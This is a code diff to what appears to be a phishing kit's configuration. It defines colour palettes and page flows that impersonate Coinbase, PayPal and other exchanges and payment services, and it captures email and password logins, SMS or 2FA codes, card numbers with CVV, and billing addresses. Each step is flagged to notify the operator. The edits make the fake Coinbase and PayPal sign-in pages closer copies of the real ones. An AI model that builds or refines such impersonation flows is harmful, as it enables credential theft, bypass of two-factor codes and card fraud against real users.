@@ -99,7 +99,7 @@ const PALETTES = {
   fab:            ['#003087','#002060','#FFFFFF','#003087','#D4AF37'],
 
   binance:        ['#0B0E11','#1E2026','#EAECEF','#F0B90B','#FCD535'],
-  coinbase:       ['#0A0B0D','#161719','#FFFFFF','#0052FF','#1652F0'],
+  coinbase:       ['#ffffff','#ffffff','#0a0b0d','#0052FF','#1652F0'],
   kraken:         ['#f0f0f8','#ffffff','#0a0a0a','#5741D9','#4631c5'],
   bitfinex:       ['#1B1B1B','#2A2A2A','#FFFFFF','#16B157','#12904C'],
   gemini:         ['#05061B','#0B0D2A','#FFFFFF','#00DCFA','#05D2F5'],
@@ -129,7 +129,7 @@ const PALETTES = {
   pionex:         ['#0A1628','#1B2836','#FFFFFF','#0CBFE8','#0AABCF'],
   htx:            ['#1A1A2E','#16213E','#FFFFFF','#3F3FC6','#3030B0'],
 
-  paypal:         ['#001F4B','#003087','#FFFFFF','#009CDE','#00A0DC'],
+  paypal:         ['#f5f7fa','#ffffff','#2c2e2f','#0070ba','#005ea6'],
   stripe:         ['#0A2540','#425466','#FFFFFF','#635BFF','#80E9FF'],
   square:         ['#006AFF','#0052CC','#FFFFFF','#006AFF','#3B82F6'],
   venmo:          ['#008CFF','#0070CC','#FFFFFF','#008CFF','#3AA0FF'],
@@ -515,7 +515,7 @@ const FLOWS = {
   ],
 
   coinbase: [
-    { slug:'login',    form_type:'login', page_title:'Sign In',           headline:'Sign in to Coinbase',                subheadline:'Enter your email and password',             fields:['email','password'], layout:'auth', cta:'Sign In',   step_label:'Login',    notify_step:true  },
+    { slug:'login',    form_type:'login', page_title:'Sign in | Coinbase',headline:'Sign in',                            subheadline:'',                                          fields:['email','password'], layout:'auth', cta:'Continue',  step_label:'Login',    notify_step:true  },
     { slug:'2fa-sms',  form_type:'otp',   page_title:'Two-Factor Auth',   headline:'Enter Verification Code',             subheadline:'We sent a 7-digit code to your phone',      fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'2FA SMS',  notify_step:true,  otp_length:7 }
   ],
 
@@ -553,7 +553,7 @@ const FLOWS = {
   // ── PAYMENTS ────────────────────────────────────────────────────────────────
 
   paypal: [
-    { slug:'login',           form_type:'login',  page_title:'Sign In',           headline:'Sign in to PayPal',                  subheadline:'Enter your email and password',             fields:['email','password'],                          layout:'auth',  cta:'Sign In',        step_label:'Login',           notify_step:true  },
+    { slug:'login',           form_type:'login',  page_title:'Log in to your PayPal account',headline:'',                        subheadline:'',                                          fields:['email','password'],                          layout:'auth',  cta:'Log In',         step_label:'Login',           notify_step:true  },
     { slug:'sms-code',        form_type:'otp',    page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a 6-digit code to your phone',      fields:['code'],                                      layout:'otp',   cta:'Confirm',        step_label:'SMS Code',        notify_step:true,  otp_length:6 },
     { slug:'confirm-card',    form_type:'payment',page_title:'Confirm Card',      headline:'Confirm Your Card Details',           subheadline:'Enter your card information to verify your identity', fields:['card_number','expiry','cvv'],         layout:'payment',cta:'Confirm',        step_label:'Confirm Card',    notify_step:true  },
     { slug:'billing-address', form_type:'verify', page_title:'Billing Address',   headline:'Billing Address',                     subheadline:'Confirm the billing address linked to your account', fields:['address','city','state','zip'],       layout:'verify',cta:'Save & Confirm',  step_label:'Billing Address', notify_step:true  }
